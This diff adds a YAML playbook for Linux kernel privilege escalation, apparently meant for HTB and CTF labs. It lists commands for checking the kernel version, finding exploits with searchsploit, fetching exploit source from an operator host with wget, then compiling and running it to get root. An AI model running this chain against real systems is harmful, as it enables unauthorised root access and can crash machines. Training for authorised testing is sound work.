@@ -1,0 +1,152 @@
+name: Linux Privilege Escalation - Kernel Exploits
+
+steps:
+
+# =========================================================
+# [1] ENUMERATE KERNEL VERSION
+# =========================================================
+- title: Enumerate Kernel Information
+  mode: enum
+  info: |
+    Identify kernel version and Linux distribution.
+
+  entries:
+
+    - cmd: "uname -a"
+      info: kernel version and architecture
+
+      look_for:
+        - "old kernels"
+        - "Ubuntu 16/18"
+        - "Debian"
+        - "x86_64"
+
+    - cmd: "cat /etc/lsb-release"
+      info: Ubuntu release information
+
+    - cmd: "cat /etc/os-release"
+      info: distribution information
+
+  notes:
+    - kernel exploits are version dependent
+    - architecture must match exploit
+    - old kernels are common in HTB easy/medium boxes
+
+# =========================================================
+# [2] FIND EXPLOITS
+# =========================================================
+- title: Find Kernel Exploits
+  mode: enum
+  info: |
+    Search for public kernel exploits matching the target version.
+
+  entries:
+
+    - cmd: "searchsploit linux kernel 4.4"
+      info: local exploit search
+
+    - cmd: "searchsploit ubuntu 16.04"
+      info: distro-specific exploits
+
+    - cmd: "google: linux 4.4.0-116-generic exploit"
+      info: manual exploit research
+
+      look_for:
+        - "Dirty COW"
+        - "overlayfs"
+        - "dirty pipe"
+        - "2021 exploits"
+
+  notes:
+    - exact kernel match is important
+    - newer exploits are usually more reliable
+    - always verify architecture compatibility
+
+# =========================================================
+# [3] TRANSFER EXPLOIT
+# =========================================================
+- title: Transfer Exploit
+  mode: chain
+  info: |
+    Transfer exploit source code to the target.
+
+  entries:
+
+    - cmd: "wget http://{ip}/kernel_exploit.c"
+      info: download exploit source
+
+    - cmd: "ls -l"
+      info: verify transfer
+
+  notes:
+    - simple HTTP servers are usually enough
+    - Python HTTP server is common for transfer
+
+# =========================================================
+# [4] COMPILE EXPLOIT
+# =========================================================
+- title: Compile Exploit
+  mode: chain
+  info: |
+    Compile the kernel exploit locally on target.
+
+  entries:
+
+    - cmd: "gcc kernel_exploit.c -o kernel_exploit"
+      info: compile exploit
+
+    - cmd: "chmod +x kernel_exploit"
+      info: make executable
+
+    - cmd: "ls -l kernel_exploit"
+      info: verify binary
+
+  notes:
+    - gcc is often installed on HTB targets
+    - if gcc missing, compile locally and upload
+
+# =========================================================
+# [5] EXECUTE EXPLOIT
+# =========================================================
+- title: Execute Exploit
+  mode: chain
+  info: |
+    Run the exploit and attempt privilege escalation.
+
+  entries:
+
+    - cmd: "./kernel_exploit"
+      info: execute exploit
+
+      look_for:
+        - "root shell"
+        - "uid=0"
+        - "whoami = root"
+
+    - cmd: "id"
+      info: verify privileges
+
+    - cmd: "whoami"
+      info: confirm root access
+
+  notes:
+    - kernel exploits may crash the system
+    - unstable exploits are common
+    - use caution outside labs/CTFs
+
+# =========================================================
+# [6] QUICK ENUMERATION
+# =========================================================
+- title: Quick Kernel Enumeration
+  mode: standard
+
+  commands:
+    - "uname -a"
+    - "cat /etc/os-release"
+    - "searchsploit kernel"
+    - "find / -name gcc 2>/dev/null"
+
+  notes:
+    - kernel version is the key finding
+    - searchsploit is usually fastest
+    - compile locally if possible
